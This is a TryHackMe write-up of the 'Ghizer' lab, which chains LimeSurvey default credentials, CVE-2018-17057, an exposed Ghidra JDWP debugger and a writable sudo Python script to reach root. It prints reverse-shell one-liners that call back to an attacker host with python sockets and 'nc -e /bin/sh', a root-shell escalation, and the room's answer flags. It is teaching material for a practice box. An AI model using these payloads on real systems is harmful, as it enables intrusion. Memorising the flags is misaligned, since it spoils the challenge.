# Ghizer — TryHackMe Walkthrough

> Lucrecia has installed multiple web applications on the server.

<p align="center">
<a href="https://imgbb.com/"><img src="https://i.ibb.co/35CqtxjF/903b4a5cc6a2d5a37b8a6564aeb9315b.png" alt="903b4a5cc6a2d5a37b8a6564aeb9315b" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/ghizerctf">
    <img src="https://img.shields.io/badge/TryHackMe-Ghizer-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-LimeSurvey%20RCE%20%7C%20Ghidra%20Debugger%20%7C%20SUID%20Python-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Security Misconfiguration |
| 3 | CVE-2018-17057 — LimeSurvey < 3.16 Remote Code Execution |
| 4 | Stored Passwords and Keys |
| 5 | Abusing SUID/GUID (Python3 sudo misconfiguration) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify multiple web applications running on different ports and protocols
- Exploit a known RCE vulnerability in LimeSurvey using a public exploit
- Extract credentials stored in application configuration files
- Abuse Ghidra's remote debugger to execute commands on the server
- Escalate privileges by writing to a Python script and running it via a misconfigured `sudo` entry

---

## Prerequisites

- Basic familiarity with Linux terminal commands and web application concepts
- Nmap, Netcat, and Python installed
- The machine may take up to 5 minutes to fully boot before scanning

---

## Task 1 — Flag

---

### Step 1 — Network Enumeration with Nmap

**Approach:** Run an aggressive Nmap scan with service detection, script scanning, and OS detection to identify all open services across the target.

```
kali@kali:~/CTFs/tryhackme/Ghizer$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 17:18 CEST
Nmap scan report for Machine_IP
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe:
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.4.2
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ghizer &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-23T17:27:31
|_Not valid after:  2030-07-21T17:27:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Network Distance: 2 hops

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   30.98 ms 10.8.0.1
2   31.23 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.89 seconds
```

> **Note:** Three ports are open. **Port 21 (FTP)** is running vsFTPd 3.0.3 and advertises anonymous access — worth testing. **Port 80 (HTTP)** is serving **LimeSurvey**, an open-source survey application. **Port 443 (HTTPS)** is serving a **WordPress 5.4.2** site. Having two separate web applications on the same server significantly expands the attack surface.

---

### Step 2 — LimeSurvey Login with Default Credentials

**Approach:** Navigate to the LimeSurvey admin login at `http://Machine_IP/index.php/admin/authentication/sa/login`. LimeSurvey installations frequently ship with default credentials. Try `admin:password`.

> **Note:** The login succeeds with `admin:password` — a default credential pair that LimeSurvey documents in its own recovery guides. Default credentials are one of the most common and most avoidable security misconfigurations. Once authenticated as admin, we have access to the plugin and template systems which can be abused for code execution.

---

### Step 3 — Remote Code Execution via CVE-2018-17057 (LimeSurvey < 3.16)

**Approach:** Use the public exploit for CVE-2018-17057 ([Exploit-DB 46634](https://www.exploit-db.com/exploits/46634)) which abuses LimeSurvey's plugin upload functionality to upload a malicious PHP file and achieve Remote Code Execution. Embed a Python reverse shell as the payload.

The reverse shell payload embedded in the exploit:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Start a Netcat listener on port 9001 and trigger the exploit. After the shell connects, check the LimeSurvey configuration file for stored credentials.

The credentials found in the LimeSurvey configuration file:

```php
'username' => 'Anny',
'password' => 'P4$W0RD!!#S3CUr3!',
```

> **Note:** CVE-2018-17057 allows an authenticated LimeSurvey admin to upload a ZIP archive containing a malicious PHP plugin file. Once uploaded and activated, the PHP code executes in the context of the web server. The configuration file — typically at `application/config/config.php` — stores database credentials in plaintext. These credentials may be reused elsewhere on the system.

---

### Question 1 — What are the credentials found in the configuration file?

<details>
<summary>Reveal Answer</summary>

**`Anny:P4$W0RD!!#S3CUr3!`**

</details>

---

### Step 4 — Identifying the WordPress Login Path

**Approach:** Browse to the WordPress installation on port 443. The non-standard login path needs to be identified. Navigate to `https://Machine_IP/?devtools` to find the Ghidra remote debugger interface exposed through WordPress.

> **Note:** Exposing a remote debugger interface (`?devtools`) through a public-facing web application is a severe misconfiguration. Ghidra is a reverse engineering tool developed by the NSA — its remote debugger uses a Java Debug Wire Protocol (JDWP) listener. If accessible, it allows arbitrary Java code execution on the server. This is the next attack vector.

---

### Question 2 — What is the login path for the WordPress installation?

<details>
<summary>Reveal Answer</summary>

**`/?devtools`**

</details>

---

### Step 5 — RCE via Ghidra Remote Debugger (JDWP)

**Approach:** Connect to the Ghidra debugger exposed at `https://Machine_IP/?devtools`. Set a breakpoint on a known Java method, then use the debugger's `print` command to execute a system command via `java.lang.Runtime.exec()`. Trigger the breakpoint, then run a Netcat reverse shell back to your listener.

Debugger commands:

```
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
print new java.lang.Runtime().exec("nc YOUR_IP 1337 -e /bin/sh")
```

Catch the shell:

```
kali@kali:~/CTFs/tryhackme/Ghizer$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [YOUR_IP] from (UNKNOWN) [Machine_IP] 40546
python -c "import pty; pty.spawn('/bin/bash')"
veronica@ubuntu:~$ cd ~
cd ~
veronica@ubuntu:~$ ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
veronica@ubuntu:~$ cat user.txt
cat user.txt
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

> **Note:** The JDWP `print` command evaluates Java expressions in the context of the running JVM process. Calling `new java.lang.Runtime().exec()` spawns a system process as the JVM's user. The shell lands as `veronica` — a standard user account. Notice that `base.py` already exists in veronica's home directory, which becomes significant in the next step.

---

### Question 3 — Compromise the machine and locate user.txt

<details>
<summary>Reveal Answer</summary>

**`THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}`**

</details>

---

### Step 6 — Privilege Escalation via sudo Python3 and base.py

**Approach:** Check `sudo -l` for available sudo permissions. If `veronica` can run `/usr/bin/python3.5` against `/home/veronica/base.py` without a password, overwrite `base.py` with a payload that spawns a root shell, then execute it via sudo.

```
veronica@ubuntu:~$ rm -rf base.py
rm -rf base.py
veronica@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' >> /home/veronica/base.py
echo 'import pty; pty.spawn("/bin/bash")' >> /home/veronica/base.py
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# cd /root
cd /root
root@ubuntu:/root# ls
ls
Lucrecia  root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
```

> **Note:** The `sudo` entry permits `veronica` to run a specific Python script as root — but it does not prevent her from modifying that script first. By deleting `base.py` and writing a new one containing `pty.spawn("/bin/bash")`, the next `sudo` execution runs our code as root and drops into a root shell. This is a classic **writable sudo script** privilege escalation. The fix is to make the target script owned by root and non-writable by the invoking user before granting sudo access to it.

---

### Question 4 — Escalate privileges and obtain root.txt

<details>
<summary>Reveal Answer</summary>

**`THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap aggressive scan | Found FTP (21), LimeSurvey on HTTP (80), WordPress on HTTPS (443) |
| 2 | LimeSurvey admin login with default credentials | Authenticated as admin |
| 3 | CVE-2018-17057 LimeSurvey RCE exploit | Gained web shell; extracted database credentials from config file |
| 4 | Browsed WordPress at `/?devtools` | Identified exposed Ghidra remote debugger interface |
| 5 | JDWP `Runtime.exec()` via Ghidra debugger | Obtained reverse shell as `veronica`; retrieved user flag |
| 6 | Overwrote `base.py` and ran via `sudo python3.5` | Escalated to root; retrieved root flag |
